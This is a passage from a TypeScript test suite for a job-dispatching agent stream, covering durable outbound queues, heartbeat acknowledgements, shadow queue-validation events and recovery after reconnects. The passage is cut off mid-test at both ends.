    expect(await outboundQueue.pendingCount()).toBe(1);

    const registered = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          jobStatusAckSupported: true,
        }),
      },
    });
    const { client, sent } = makeMockClient([registered], 50);
    const replay = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-replay",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 100,
    });
    activeStreams.push(replay);
    const runPromise = replay.start();
    await waitForCondition(() =>
      sent.some(
        (message) =>
          (message as { payload: { case: string; value?: { jobId?: string } } }).payload.value
            ?.jobId === "half-open-terminal",
      ),
    );
    replay.stop();
    await runPromise;

    const terminal = sent.find(
      (message) =>
        (message as { payload: { case: string; value?: { jobId?: string } } }).payload.value
          ?.jobId === "half-open-terminal",
    ) as { payload: { value: { collected: Record<string, string>; eventId: string } } } | undefined;
    expect(terminal?.payload.value.collected).toEqual({ result: "42" });
    expect(terminal?.payload.value.eventId).toBe("event-half-open");
    expect(await outboundQueue.pendingCount()).toBe(1);
    const replayHarness = replay as unknown as {
      handleServerMessage: (message: unknown) => Promise<void>;
    };
    await replayHarness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "jobStatusAck",
          value: create(JobStatusAckSchema, { eventId: "event-half-open" }),
        },
      }),
    );
    expect(await outboundQueue.pendingCount()).toBe(0);
  });

  test("awaits durable inbound dispatch persistence before scheduler submission", async () => {
    let releasePersist: (() => void) | undefined;
    const persisted = new Promise<void>((resolve) => {
      releasePersist = resolve;
    });
    const db = createSqliteDb(":memory:");
    const inboundAcks = new BlockingInboundAcks(db, () => persisted);
    let submitted = false;
    const { client } = makeMockClient([
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "durable-dispatch",
            name: "durable dispatch",
            command: "true",
            cpus: 1,
            memoryMb: 64n,
            wallTimeSec: 60n,
          }),
        },
      }),
    ]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submitted = true;
          return { schedulerJobId: "scheduler-1" };
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      inboundAcks,
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle();
    expect(inboundAcks.started).toBe(true);
    expect(submitted).toBe(false);

    releasePersist?.();
    await settle();
    expect(submitted).toBe(true);
    stream.stop();
    await runPromise;
  });

  test("keeps shadow submission compatible while a failed first enqueue gates queue readiness", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new FailOnceShadowEnqueueOutboundQueue(db);
    const observedAt = new Date();
    let submissions = 0;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, {
              accepted: true,
              message: "ok",
              heartbeatAckSupported: true,
              queueInventoryV1Supported: true,
              queueValidationShadowRejectionAckSupported: true,
            }),
          },
        }),
        create(ServerMessageSchema, {
          payload: {
            case: "dispatchJob",
            value: create(DispatchJobSchema, {
              jobId: "shadow-enqueue-failure-job",
              name: "shadow enqueue failure",
              command: "echo still-submitted",
              cpus: 1,
              memoryMb: 128n,
              wallTimeSec: 60n,
              workingDir: "/tmp",
              queueName: "drained",
              queueTargetMode: QueueTargetMode.NAMED,
              queueValidationMode: QueueValidationMode.SHADOW,
            }),
          },
        }),
      ],
      300,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submissions += 1;
          return { schedulerJobId: "shadow-enqueue-failure-scheduler-job" };
        },
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
        validateQueueTarget: async () => ({
          accepted: false,
          failureCode: "QUEUE_NOT_ACCEPTING",
        }),
        statusSeq: [{ status: "completed", exitCode: 0 }],
      }),
      agentId: "agent-shadow-enqueue-failure",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      heartbeatAckTimeoutMs: 1_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
      outboundQueue,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(
      () =>
        submissions === 1 &&
        sent.some((message) => {
          const payload = (
            message as {
              payload?: {
                case?: string;
                value?: { queueInventory?: { status?: QueueInventoryStatus } };
              };
            }
          ).payload;
          return (
            payload?.case === "heartbeat" &&
            payload.value?.queueInventory?.status === QueueInventoryStatus.UNAVAILABLE
          );
        }),
    );

    const unavailableHeartbeat = sent.find((message) => {
      const payload = (
        message as {
          payload?: {
            case?: string;
            value?: { queueInventory?: { status?: QueueInventoryStatus } };
          };
        }
      ).payload;
      return (
        payload?.case === "heartbeat" &&
        payload.value?.queueInventory?.status === QueueInventoryStatus.UNAVAILABLE
      );
    }) as
      | {
          payload: {
            value: {
              sequence: bigint;
              queueInventory: { reason: string; status: QueueInventoryStatus };
            };
          };
        }
      | undefined;
    expect(submissions).toBe(1);
    expect(unavailableHeartbeat?.payload.value.queueInventory).toMatchObject({
      status: QueueInventoryStatus.UNAVAILABLE,
      reason: "command_failed",
    });
    expect(
      sent.some(
        (message) =>
          (message as { payload?: { case?: string } }).payload?.case ===
          "queueValidationShadowRejection",
      ),
    ).toBe(true);

    const unavailableSequence = unavailableHeartbeat?.payload.value.sequence;
    if (!unavailableSequence) throw new Error("unavailable heartbeat sequence missing");
    await (
      stream as unknown as { handleServerMessage: (message: ServerMessage) => Promise<void> }
    ).handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "heartbeatAck",
          value: create(HeartbeatAckSchema, { sequence: unavailableSequence }),
        },
      }),
    );
    await waitForCondition(() =>
      sent.some((message) => {
        const payload = (
          message as {
            payload?: {
              case?: string;
              value?: { sequence?: bigint; queueInventory?: { status?: QueueInventoryStatus } };
            };
          }
        ).payload;
        return (
          payload?.case === "heartbeat" &&
          payload.value?.sequence !== unavailableSequence &&
          payload.value?.queueInventory?.status === QueueInventoryStatus.AVAILABLE
        );
      }),
    );

    stream.stop();
    await runPromise;
  });

  test("keeps outbox read failures unavailable until Server acknowledgement then reports ready", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new FailOncePendingCountOutboundQueue(db);
    const observedAt = new Date();
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, {
              accepted: true,
              message: "ok",
              heartbeatAckSupported: true,
              queueInventoryV1Supported: true,
              queueValidationShadowRejectionAckSupported: true,
            }),
          },
        }),
      ],
      300,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
      }),
      agentId: "agent-shadow-read-failure",
      siteName: "test-site",
      heartbeatIntervalMs: 2,
      heartbeatAckTimeoutMs: 1_000,
      logger: silent,
      reconnectBackoffMs: 1,
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
      outboundQueue,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    const unavailableHeartbeats = () =>
      sent.filter((message) => {
        const payload = (
          message as {
            payload?: {
              case?: string;
              value?: { queueInventory?: { status?: QueueInventoryStatus } };
            };
          }
        ).payload;
        return (
          payload?.case === "heartbeat" &&
          payload.value?.queueInventory?.status === QueueInventoryStatus.UNAVAILABLE
        );
      }) as Array<{
        payload: { value: { sequence: bigint; queueInventory: { reason: string } } };
      }>;
    await waitForCondition(() => unavailableHeartbeats().length === 1);
    const firstUnavailable = unavailableHeartbeats()[0];
    if (!firstUnavailable) throw new Error("first unavailable heartbeat missing");
    expect(firstUnavailable.payload.value.queueInventory.reason).toBe("command_failed");

    await (
      stream as unknown as { handleServerMessage: (message: ServerMessage) => Promise<void> }
    ).handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "heartbeatAck",
          value: create(HeartbeatAckSchema, {
            sequence: firstUnavailable.payload.value.sequence,
          }),
        },
      }),
    );
    await waitForCondition(() => unavailableHeartbeats().length === 2);
    expect(
      sent.some((message) => {
        const payload = (
          message as {
            payload?: { case?: string; value?: { queueInventory?: { status?: number } } };
          }
        ).payload;
        return (
          payload?.case === "heartbeat" &&
          payload.value?.queueInventory?.status === QueueInventoryStatus.AVAILABLE
        );
      }),
    ).toBe(false);

    const recoveryCandidate = unavailableHeartbeats()[1];
    if (!recoveryCandidate) throw new Error("recovery heartbeat missing");
    await (
      stream as unknown as { handleServerMessage: (message: ServerMessage) => Promise<void> }
    ).handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "heartbeatAck",
          value: create(HeartbeatAckSchema, {
            sequence: recoveryCandidate.payload.value.sequence,
          }),
        },
      }),
    );
    await waitForCondition(() =>
      sent.some((message) => {
        const payload = (
          message as {
            payload?: { case?: string; value?: { queueInventory?: { status?: number } } };
          }
        ).payload;
        return (
          payload?.case === "heartbeat" &&
          payload.value?.queueInventory?.status === QueueInventoryStatus.AVAILABLE
        );
      }),
    );

    stream.stop();
    await runPromise;
  });

  test("keeps a permanent shadow enqueue failure unavailable until the same event is persisted", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new ControllableShadowOutboundQueue(db);
    outboundQueue.enqueueAvailable = false;
    const observedAt = new Date();
    const registered = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          heartbeatAckSupported: true,
          queueInventoryV1Supported: true,
          queueValidationShadowRejectionAckSupported: true,
        }),
      },
    });
    const { client, sent } = makeMockClient([registered], 1_000);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
      }),
      agentId: "agent-permanent-shadow-enqueue",
      siteName: "test-site",
      heartbeatIntervalMs: 2,
      heartbeatAckTimeoutMs: 1_000,
      logger: silent,
      outboundQueue,
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const runPromise = stream.start();

    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE).length === 1,
    );
    const healthy = queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE)[0];
    if (!healthy) throw new Error("healthy heartbeat missing");
    await expect(
      (
        stream as unknown as {
          enqueueQueueValidationShadowRejection: (failureCode: "QUEUE_CHANGED") => Promise<void>;
        }
      ).enqueueQueueValidationShadowRejection("QUEUE_CHANGED"),
    ).rejects.toThrow("injected permanent shadow enqueue failure");
    expect(queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)).toHaveLength(0);

    await deliverServerMessage(stream, heartbeatAck(healthy.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 1,
    );
    const firstUnavailable = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[0];
    if (!firstUnavailable) throw new Error("first unavailable heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(firstUnavailable.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 2,
    );
    expect(queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE)).toHaveLength(1);
    expect(new Set(outboundQueue.enqueueEventIds).size).toBe(1);

    outboundQueue.enqueueAvailable = true;
    const secondUnavailable = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[1];
    if (!secondUnavailable) throw new Error("second unavailable heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(secondUnavailable.payload.value.sequence));
    await waitForCondition(() =>
      sent.some(
        (message) =>
          (message as { payload?: { case?: string } }).payload?.case ===
          "queueValidationShadowRejection",
      ),
    );
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 3,
    );
    const shadowEvent = sent.find(
      (message) =>
        (message as { payload?: { case?: string } }).payload?.case ===
        "queueValidationShadowRejection",
    ) as { payload: { value: { eventId: string } } } | undefined;
    if (!shadowEvent) throw new Error("retried shadow event missing");
    await deliverServerMessage(
      stream,
      create(ServerMessageSchema, {
        payload: {
          case: "queueValidationShadowRejectionAck",
          value: create(QueueValidationShadowRejectionAckSchema, {
            eventId: shadowEvent.payload.value.eventId,
          }),
        },
      }),
    );
    const recovery = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[2];
    if (!recovery) throw new Error("recovery heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(recovery.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE).length === 2,
    );

    expect(new Set(outboundQueue.enqueueEventIds).size).toBe(1);
    stream.stop();
    await runPromise;
  });

  test("retries loadForReplay and replays the durable shadow event before recovering", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new ControllableShadowOutboundQueue(db);
    await outboundQueue.enqueueQueueValidationShadowRejection(
      "QUEUE_NOT_ACCEPTING",
      "shadow-replay-read-event",
    );
    outboundQueue.replayAvailable = false;
    const observedAt = new Date();
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, {
              accepted: true,
              message: "ok",
              heartbeatAckSupported: true,
              queueInventoryV1Supported: true,
              queueValidationShadowRejectionAckSupported: true,
            }),
          },
        }),
      ],
      1_000,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
      }),
      agentId: "agent-shadow-replay-read-failure",
      siteName: "test-site",
      heartbeatIntervalMs: 2,
      heartbeatAckTimeoutMs: 1_000,
      logger: silent,
      outboundQueue,
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const runPromise = stream.start();

    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 1,
    );
    const firstUnavailable = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[0];
    if (!firstUnavailable) throw new Error("first replay failure heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(firstUnavailable.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 2,
    );
    expect(
      sent.some(
        (message) =>
          (message as { payload?: { case?: string } }).payload?.case ===
          "queueValidationShadowRejection",
      ),
    ).toBe(false);
    expect(queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE)).toHaveLength(0);

    outboundQueue.replayAvailable = true;
    const secondUnavailable = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[1];
    if (!secondUnavailable) throw new Error("second replay failure heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(secondUnavailable.payload.value.sequence));
    await waitForCondition(() =>
      sent.some((message) => {
        const payload = (message as { payload?: { case?: string; value?: { eventId?: string } } })
          .payload;
        return (
          payload?.case === "queueValidationShadowRejection" &&
          payload.value?.eventId === "shadow-replay-read-event"
        );
      }),
    );
    expect(outboundQueue.loadForReplayCalls).toBeGreaterThanOrEqual(3);

    await deliverServerMessage(
      stream,
      create(ServerMessageSchema, {
        payload: {
          case: "queueValidationShadowRejectionAck",
          value: create(QueueValidationShadowRejectionAckSchema, {
            eventId: "shadow-replay-read-event",
          }),
        },
      }),
    );
    const acknowledged = new Set<bigint>([
      firstUnavailable.payload.value.sequence,
      secondUnavailable.payload.value.sequence,
    ]);
    for (let attempt = 0; attempt < 4; attempt += 1) {
      if (queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE).length > 0) break;
      await waitForCondition(
        () =>
          queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE).length > 0 ||
          queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).some(
            (heartbeat) => !acknowledged.has(heartbeat.payload.value.sequence),
          ),
      );
      const next = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).find(
        (heartbeat) => !acknowledged.has(heartbeat.payload.value.sequence),
      );
      if (!next) break;
      acknowledged.add(next.payload.value.sequence);
      await deliverServerMessage(stream, heartbeatAck(next.payload.value.sequence));
    }
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE).length > 0,
    );

    stream.stop();
    await runPromise;
  });

  test("keeps ACK deletion failures unavailable until the same event deletion succeeds", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new ControllableShadowOutboundQueue(db);
    await outboundQueue.enqueueQueueValidationShadowRejection(
      "QUEUE_CHANGED",
      "shadow-ack-delete-event",
    );
    outboundQueue.acknowledgeAvailable = false;
    const observedAt = new Date();
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, {
              accepted: true,
              message: "ok",
              heartbeatAckSupported: true,
              queueInventoryV1Supported: true,
              queueValidationShadowRejectionAckSupported: true,
            }),
          },
        }),
      ],
      1_000,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
      }),
      agentId: "agent-shadow-ack-delete-failure",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      heartbeatAckTimeoutMs: 1_000,
      logger: silent,
      outboundQueue,
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const runPromise = stream.start();

    await waitForCondition(() =>
      sent.some((message) => {
        const payload = (message as { payload?: { case?: string; value?: { eventId?: string } } })
          .payload;
        return (
          payload?.case === "queueValidationShadowRejection" &&
          payload.value?.eventId === "shadow-ack-delete-event"
        );
      }),
    );
    await deliverServerMessage(
      stream,
      create(ServerMessageSchema, {
        payload: {
          case: "queueValidationShadowRejectionAck",
          value: create(QueueValidationShadowRejectionAckSchema, {
            eventId: "shadow-ack-delete-event",
          }),
        },
      }),
    );
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 1,
    );
    const firstUnavailable = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[0];
    if (!firstUnavailable) throw new Error("ACK deletion failure heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(firstUnavailable.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 2,
    );
    expect(queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE)).toHaveLength(0);

    outboundQueue.acknowledgeAvailable = true;
    const secondUnavailable = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[1];
    if (!secondUnavailable) throw new Error("second ACK deletion failure heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(secondUnavailable.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE).length === 3,
    );
    const recovery = queueInventoryHeartbeats(sent, QueueInventoryStatus.UNAVAILABLE)[2];
    if (!recovery) throw new Error("ACK deletion recovery heartbeat missing");
    await deliverServerMessage(stream, heartbeatAck(recovery.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(sent, QueueInventoryStatus.AVAILABLE).length === 1,
    );
    expect(outboundQueue.acknowledgeCalls).toBeGreaterThanOrEqual(3);
    expect(await outboundQueue.pendingCount()).toBe(0);

    stream.stop();
    await runPromise;
  });

  test("replays the unavailable latch immediately after reconnect without waiting for the timer", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new ControllableShadowOutboundQueue(db);
    outboundQueue.enqueueAvailable = false;
    const observedAt = new Date();
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          heartbeatAckSupported: true,
          queueInventoryV1Supported: true,
          queueValidationShadowRejectionAckSupported: true,
        }),
      },
    });
    let closeFirst: (() => void) | undefined;
    const firstClosed = new Promise<void>((resolve) => {
      closeFirst = resolve;
    });
    const sentByConnection: unknown[][] = [[], []];
    let connectionCount = 0;
    const clientFactory = () => {
      const connection = connectionCount;
      connectionCount += 1;
      const sent = sentByConnection[connection] ?? [];
      sentByConnection[connection] = sent;
      return {
        connect(request: AsyncIterable<unknown>, options?: { signal?: AbortSignal }) {
          void (async () => {
            for await (const message of request) sent.push(message);
          })().catch(() => {});
          return (async function* () {
            yield accepted;
            if (connection === 0) {
              await firstClosed;
              return;
            }
            await new Promise<void>((resolve) => {
              if (options?.signal?.aborted) {
                resolve();
                return;
              }
              options?.signal?.addEventListener("abort", () => resolve(), { once: true });
            });
          })();
        },
      } as never;
    };
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      clientFactory,
      adapter: makeAdapter({
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
      }),
      agentId: "agent-shadow-outbox-reconnect",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      heartbeatAckTimeoutMs: 1_000,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const runPromise = stream.start();

    await waitForCondition(() => connectionCount === 1);
    await expect(
      (
        stream as unknown as {
          enqueueQueueValidationShadowRejection: (failureCode: "QUEUE_CHANGED") => Promise<void>;
        }
      ).enqueueQueueValidationShadowRejection("QUEUE_CHANGED"),
    ).rejects.toThrow("injected permanent shadow enqueue failure");
    const firstSent = sentByConnection[0];
    if (!firstSent) throw new Error("first connection messages missing");
    await waitForCondition(
      () => queueInventoryHeartbeats(firstSent, QueueInventoryStatus.UNAVAILABLE).length === 1,
    );

    closeFirst?.();
    await waitForCondition(() => connectionCount >= 2);
    const secondSent = sentByConnection[1];
    if (!secondSent) throw new Error("second connection messages missing");
    await waitForCondition(
      () => queueInventoryHeartbeats(secondSent, QueueInventoryStatus.UNAVAILABLE).length === 1,
    );
    expect(queueInventoryHeartbeats(secondSent, QueueInventoryStatus.AVAILABLE)).toHaveLength(0);

    stream.stop();
    await runPromise;
  });

  test("ignores a delayed heartbeat preparation from the old connection during recovery", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new FailOnceShadowEnqueueOutboundQueue(db);
    const observedAt = new Date();
    let releaseFirstInspection: (() => void) | undefined;
    const firstInspection = new Promise<void>((resolve) => {
      releaseFirstInspection = resolve;
    });
    let inspectionCalls = 0;
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          heartbeatAckSupported: true,
          queueInventoryV1Supported: true,
          queueValidationShadowRejectionAckSupported: true,
        }),
      },
    });
    let closeFirst: (() => void) | undefined;
    const firstClosed = new Promise<void>((resolve) => {
      closeFirst = resolve;
    });
    const sentByConnection: unknown[][] = [[], []];
    let connectionCount = 0;
    const clientFactory = () => {
      const connection = connectionCount;
      connectionCount += 1;
      const sent = sentByConnection[connection] ?? [];
      sentByConnection[connection] = sent;
      return {
        connect(request: AsyncIterable<unknown>, options?: { signal?: AbortSignal }) {
          void (async () => {
            for await (const message of request) sent.push(message);
          })().catch(() => {});
          return (async function* () {
            yield accepted;
            if (connection === 0) {
              await firstClosed;
              return;
            }
            await new Promise<void>((resolve) => {
              if (options?.signal?.aborted) {
                resolve();
                return;
              }
              options?.signal?.addEventListener("abort", () => resolve(), { once: true });
            });
          })();
        },
      } as never;
    };
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      clientFactory,
      adapter: makeAdapter({
        inspectQueues: async () => {
          inspectionCalls += 1;
          if (inspectionCalls === 1) await firstInspection;
          return {
            status: "available",
            defaultQueueName: "batch",
            observedAt,
            queues: [
              {
                queueName: "batch",
                queueType: "partition",
                isDefault: true,
                state: "up",
                acceptsSubmissions: true,
                observedAt,
              },
            ],
          };
        },
      }),
      agentId: "agent-shadow-outbox-delayed-heartbeat",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      heartbeatAckTimeoutMs: 5_000,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const runPromise = stream.start();

    await waitForCondition(() => connectionCount === 1);
    await expect(
      (
        stream as unknown as {
          enqueueQueueValidationShadowRejection: (failureCode: "QUEUE_CHANGED") => Promise<void>;
        }
      ).enqueueQueueValidationShadowRejection("QUEUE_CHANGED"),
    ).rejects.toThrow("injected shadow enqueue failure");
    await waitForCondition(() => inspectionCalls === 1);

    closeFirst?.();
    await waitForCondition(() => connectionCount >= 2);
    const secondSent = sentByConnection[1];
    if (!secondSent) throw new Error("second connection messages missing");
    await waitForCondition(
      () => queueInventoryHeartbeats(secondSent, QueueInventoryStatus.UNAVAILABLE).length === 1,
    );
    const recovery = queueInventoryHeartbeats(secondSent, QueueInventoryStatus.UNAVAILABLE)[0];
    if (!recovery) throw new Error("recovery heartbeat missing");

    releaseFirstInspection?.();
    await settle();
    await deliverServerMessage(stream, heartbeatAck(recovery.payload.value.sequence));
    await waitForCondition(
      () => queueInventoryHeartbeats(secondSent, QueueInventoryStatus.AVAILABLE).length === 1,
    );

    stream.stop();
    await runPromise;
  });

  test("keeps the new connection heartbeat timer after the old replay generator exits", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new DelayedReplayOutboundQueue(db, false);
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          queueInventoryV1Supported: true,
        }),
      },
    });
    const reconnect = makeReplayReconnectClient(accepted, outboundQueue.firstLoadStarted);
    const { client } = makeMockClient([]);
    const observedAt = new Date();
    const stream = new AgentStream({
      client,
      clientFactory: reconnect.clientFactory,
      adapter: makeAdapter({
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
      }),
      agentId: "agent-replay-timer-generation",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const runPromise = stream.start();

    await waitForCondition(() => reconnect.connectionCount() >= 2);
    await waitForCondition(() => outboundQueue.loadForReplayCalls >= 2);
    const secondSent = reconnect.sentByConnection[1];
    if (!secondSent) throw new Error("second connection messages missing");
    await waitForCondition(() => queueInventoryHeartbeats(secondSent).length >= 2);

    outboundQueue.releaseFirstLoad();
    const firstRequestDone = reconnect.requestDoneByConnection[0];
    if (!firstRequestDone) throw new Error("first request completion missing");
    await firstRequestDone;
    await settle();
    const heartbeatCountAfterOldGenerator = queueInventoryHeartbeats(secondSent).length;
    await waitForCondition(
      () => queueInventoryHeartbeats(secondSent).length >= heartbeatCountAfterOldGenerator + 2,
      250,
    );

    stream.stop();
    await runPromise;
  });

  test("does not let an old replay read clear the current connection recovery obligation", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new DelayedReplayOutboundQueue(db, true);
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          queueInventoryV1Supported: true,
        }),
      },
    });
    const reconnect = makeReplayReconnectClient(accepted, outboundQueue.firstLoadStarted);
    const { client } = makeMockClient([]);
    const observedAt = new Date();
    const stream = new AgentStream({
      client,
      clientFactory: reconnect.clientFactory,
      adapter: makeAdapter({
        inspectQueues: async () => ({
          status: "available",
          defaultQueueName: "batch",
          observedAt,
          queues: [
            {
              queueName: "batch",
              queueType: "partition",
              isDefault: true,
              state: "up",
              acceptsSubmissions: true,
              observedAt,
            },
          ],
        }),
      }),
      agentId: "agent-replay-read-generation",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 1,
